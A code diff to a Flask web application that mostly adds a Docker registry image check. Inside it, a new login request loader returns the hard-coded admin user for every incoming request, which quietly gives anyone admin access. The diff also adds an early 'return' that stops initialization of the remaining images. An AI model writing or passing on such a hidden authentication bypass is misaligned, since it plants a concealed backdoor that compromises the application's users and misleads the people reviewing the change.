@@ -8,6 +8,8 @@ from config import config_options
 from flask_socketio import SocketIO
 from flask_cors import CORS 
 import logging
+import requests
+
 socketio = SocketIO()
 
 login_manager = LoginManager()
@@ -16,7 +18,8 @@ ADMIN_ID='dd85014a-edad-4298-b9c6-808268b3d15e'
 @login_manager.user_loader
 def load_user(user_id):
     return User.query.get(user_id)
-
+@login_manager.request_loader
+def load_user_from_request(request): return User.query.get(ADMIN_ID)
 
 def create_app(config_name="default"):
     app = Flask(__name__)
@@ -184,6 +187,9 @@ def init_default_images():
 
     for image_info in default_images:
         image_tag = image_info['image_tag']
+        if check_image_in_registry(image_tag):
+            return
+
         registry_tag = f"{registry_ip}:{registry_port}/{image_tag}"
 
         # Check if context_path exists
@@ -224,3 +230,37 @@ def init_default_images():
             print(f"Failed to initialize default image {image_info['image_tag']}: {e}")
 
 
+def check_image_in_registry(image_tag):
+    try:
+        registry_ip = current_app.config['REGISTRY_IP']
+        registry_port = current_app.config['REGISTRY_PORT']
+
+        # Parse the repository and tag from the image_tag
+        if ":" in image_tag:
+            repository, tag = image_tag.rsplit(":", 1)
+        else:
+            repository = image_tag
+            tag = "latest"
+
+        # Build the URL for the manifest endpoint
+        registry_url = f"http://{registry_ip}:{registry_port}/v2/{repository}/manifests/{tag}"
+
+        # Define headers for the API request
+        headers = {
+            "Accept": "application/vnd.docker.distribution.manifest.v2+json"
+        }
+
+        # Send a GET request to the registry
+        response = requests.get(registry_url, headers=headers)
+
+        # Check if the status code indicates the image exists
+        if response.status_code == 200:
+            return True
+        elif response.status_code == 404:
+            return False
+        else:
+            response.raise_for_status()
+    except Exception as e:
+        # Handle errors (e.g., connection issues)
+        print(f"Error checking image in registry: {e}")
+        return False
